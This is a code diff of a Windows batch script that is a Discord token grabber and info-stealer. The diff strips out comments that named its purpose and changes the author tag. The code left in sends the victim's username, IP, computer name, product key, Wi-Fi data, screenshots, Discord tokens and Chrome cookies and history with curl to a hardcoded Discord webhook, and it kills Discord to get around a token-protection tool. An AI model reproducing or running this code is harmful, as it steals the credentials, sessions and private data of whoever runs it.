@@ -1,8 +1,6 @@
 
    
 @echo off
-:: i dont take any responsibility for damage done with the programm it's for educational purposes only
-::replace the YOURWEBHOOK field with your webhook
 set webhook=https://discord.com/api/webhooks/945632689044725790/B4oEpd70mN-ZL8V921O0jlFlcHrgzkkJN3o2amxjXMxr31Z1uZZntJW8q5BG4LgjDWHh
 
 
@@ -88,8 +86,6 @@ echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppDa
 timeout 1 >NUL
 Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1 
 
-::sends the username, ip, current time, and date of the victim
-
 
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
 
@@ -102,8 +98,6 @@ curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\uuid.txt %webhook%
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\wlan.txt %webhook%
  
-
-::grabbs the token
 
 echo $hook  = "%webhook%" >%userprofile%\AppData\Local\Temp\testtttt.ps1
 echo $token = new-object System.Collections.Specialized.StringCollection >>%userprofile%\AppData\Local\Temp\testtttt.ps1
@@ -182,7 +176,7 @@ echo var X = window.localStorage = document.body.appendChild(document.createElem
 if %killdc% == 1 goto d
 goto e
 :d
-::coded by baum#2873
+::coded by baomi#1775
 
 ::DiscordTokenProtector Fucker
 taskkill /im Discord.exe /f
@@ -246,7 +240,6 @@ set /p keya=<%localappdata%\Temp\Productkey.txt
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Productkey: %keya%\"}" %webhook%
 
 
-::not decrypted passwords
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Chrome data \"}" %webhook%
 curl -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhook%
 curl -F h=@"%localappdata%\Google\Chrome\User Data\Default\History" %webhook%
